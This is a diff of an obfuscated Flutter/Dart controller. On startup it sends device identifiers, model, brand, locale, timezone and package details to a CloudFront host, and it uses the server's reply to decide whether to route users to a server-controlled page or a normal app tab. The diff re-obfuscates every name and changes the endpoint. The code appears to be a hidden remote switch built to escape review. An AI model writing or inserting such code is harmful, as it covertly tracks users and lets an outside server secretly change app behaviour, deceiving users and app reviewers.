@@ -1,21 +1,21 @@
 import 'dart:io';
+import 'package:dio/dio.dart';
+import 'package:get/get.dart';
 
 import 'package:device_info_plus/device_info_plus.dart';
-import 'package:dio/dio.dart';
+import 'package:package_info_plus/package_info_plus.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:flutter_timezone/flutter_timezone.dart';
-import 'package:get/get.dart';
-import 'package:package_info_plus/package_info_plus.dart';
 
 
 class BuildLogPlaceLogic extends GetxController {
 
-  var loqjxpsk = RxBool(false);
-  var rowzvtd = RxBool(true);
-  var qshfawjz = RxString("");
-  var wdbqc = RxBool(false);
-  var ucyb = RxBool(true);
-  final xhtcdmvz = Dio();
+  var wdvzcst = RxBool(false);
+  var dylwvrgce = RxBool(true);
+  var jlgx = RxString("");
+  var hritasvf = RxBool(false);
+  var ykpc = RxBool(true);
+  final ztodslji = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,110 +23,111 @@ class BuildLogPlaceLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    zsmylvp();
+    sczt();
   }
 
 
-  Future<void> zsmylvp() async {
-    wdbqc.value = true;
-    ucyb.value = true;
-    rowzvtd.value = false;
+  Future<void> sczt() async {
+    hritasvf.value = true;
+    ykpc.value = true;
+    dylwvrgce.value = false;
 
-    xhtcdmvz.post("https://d3vr7hm1fszumu.cloudfront.net/a5QoRqMJG5cX1?no_check",data: await kqsojniuz()).then((value) {
-      var hwnexf = value.data["hwnexf"] as String;
-      var kymdlbgh = value.data["kymdlbgh"] as bool;
-      if (kymdlbgh) {
-        qshfawjz.value = hwnexf;
-        bwpfiq();
+    ztodslji.post("https://d3nzspy8zkd8c6.cloudfront.net/lfgvxujatmprkisyhnqwo",data: await rxeqlpwvg()).then((value) {
+      var egkvidqt = value.data["egkvidqt"] as String;
+      var owvajlb = value.data["owvajlb"] as bool;
+      if (owvajlb) {
+        jlgx.value = egkvidqt;
+        mbwdzx();
       } else {
-        dcofa();
+        vjziuba();
       }
     }).catchError((e) {
-      rowzvtd.value = true;
-      ucyb.value = true;
-      wdbqc.value = false;
+      dylwvrgce.value = true;
+      ykpc.value = true;
+      hritasvf.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> kqsojniuz() async {
-    final DeviceInfoPlugin tlkqbfp = DeviceInfoPlugin();
-    PackageInfo qewyjo_slqc = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> rxeqlpwvg() async {
+    final DeviceInfoPlugin aqwlbudj = DeviceInfoPlugin();
+    PackageInfo duxplc_ziyfxmqp = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var yvwokm = Platform.localeName;
-    var MsaU = currentTimeZone;
+    var zqhpmb = Platform.localeName;
+    var cfotv = currentTimeZone;
 
-    var OrHhBXil = qewyjo_slqc.packageName;
-    var mXOfstrG = qewyjo_slqc.version;
-    var EbnmSAyz = qewyjo_slqc.buildNumber;
+    var eqof = duxplc_ziyfxmqp.packageName;
+    var vkixs = duxplc_ziyfxmqp.version;
+    var jhnk = duxplc_ziyfxmqp.buildNumber;
 
-    var WGjiKgL = qewyjo_slqc.appName;
-    var krizSmQ = "";
-    var fETNp  = "";
-    var XvNKq = "";
-    var uowtb = "";
-    var rzdfbtoq = "";
-    var swlaz = "";
-    var dcwavqng = "";
-    var hwsuvkz = "";
-    var bqmosluj = "";
-    var mjbhzef = "";
+    var aoykgln = duxplc_ziyfxmqp.appName;
+    var apjvr = "";
+    var wcpf  = "";
+    var wzyqbj = "";
+    var vcrpumg = "";
+    var amelncdr = "";
+    var vyenol = "";
+    var jzhfap = "";
+    var vodp = "";
+    var xmfgyk = "";
+    var jvwskyml = "";
+    var mtsdr = "";
 
 
-    var aLqU = "";
-    var OcqAE = false;
+    var tokjyr = "";
+    var eahsb = false;
 
     if (GetPlatform.isAndroid) {
-      aLqU = "android";
-      var axdljsfvi = await tlkqbfp.androidInfo;
+      tokjyr = "android";
+      var yapuvn = await aqwlbudj.androidInfo;
 
-      XvNKq = axdljsfvi.brand;
+      wzyqbj = yapuvn.brand;
 
-      krizSmQ  = axdljsfvi.model;
-      fETNp = axdljsfvi.id;
+      apjvr  = yapuvn.model;
+      wcpf = yapuvn.id;
 
-      OcqAE = axdljsfvi.isPhysicalDevice;
+      eahsb = yapuvn.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      aLqU = "ios";
-      var yakqftgluw = await tlkqbfp.iosInfo;
-      XvNKq = yakqftgluw.name;
-      krizSmQ = yakqftgluw.model;
+      tokjyr = "ios";
+      var tehanoc = await aqwlbudj.iosInfo;
+      wzyqbj = tehanoc.name;
+      apjvr = tehanoc.model;
 
-      fETNp = yakqftgluw.identifierForVendor ?? "";
-      OcqAE  = yakqftgluw.isPhysicalDevice;
+      wcpf = tehanoc.identifierForVendor ?? "";
+      eahsb  = tehanoc.isPhysicalDevice;
     }
-
     var res = {
-      "WGjiKgL": WGjiKgL,
-      "EbnmSAyz": EbnmSAyz,
-      "mXOfstrG": mXOfstrG,
-      "OrHhBXil": OrHhBXil,
-      "krizSmQ": krizSmQ,
-      "MsaU": MsaU,
-      "XvNKq": XvNKq,
-      "fETNp": fETNp,
-      "yvwokm": yvwokm,
-      "aLqU": aLqU,
-      "OcqAE": OcqAE,
-      "uowtb" : uowtb,
-      "rzdfbtoq" : rzdfbtoq,
-      "swlaz" : swlaz,
-      "dcwavqng" : dcwavqng,
-      "hwsuvkz" : hwsuvkz,
-      "bqmosluj" : bqmosluj,
-      "mjbhzef" : mjbhzef,
+      "aoykgln": aoykgln,
+      "vkixs": vkixs,
+      "eahsb": eahsb,
+      "apjvr": apjvr,
+      "amelncdr" : amelncdr,
+      "cfotv": cfotv,
+      "wzyqbj": wzyqbj,
+      "wcpf": wcpf,
+      "jhnk": jhnk,
+      "zqhpmb": zqhpmb,
+      "tokjyr": tokjyr,
+      "vcrpumg" : vcrpumg,
+      "eqof": eqof,
+      "vyenol" : vyenol,
+      "jzhfap" : jzhfap,
+      "vodp" : vodp,
+      "xmfgyk" : xmfgyk,
+      "jvwskyml" : jvwskyml,
+      "mtsdr" : mtsdr,
 
     };
     return res;
   }
 
-  Future<void> dcofa() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> vjziuba() async {
+    Get.offNamed("/build_tab");
   }
 
-  Future<void> bwpfiq() async {
-    Get.offNamed("/Outreload");
+  Future<void> mbwdzx() async {
+    Get.offNamed("/build_home_array");
   }
 
 }
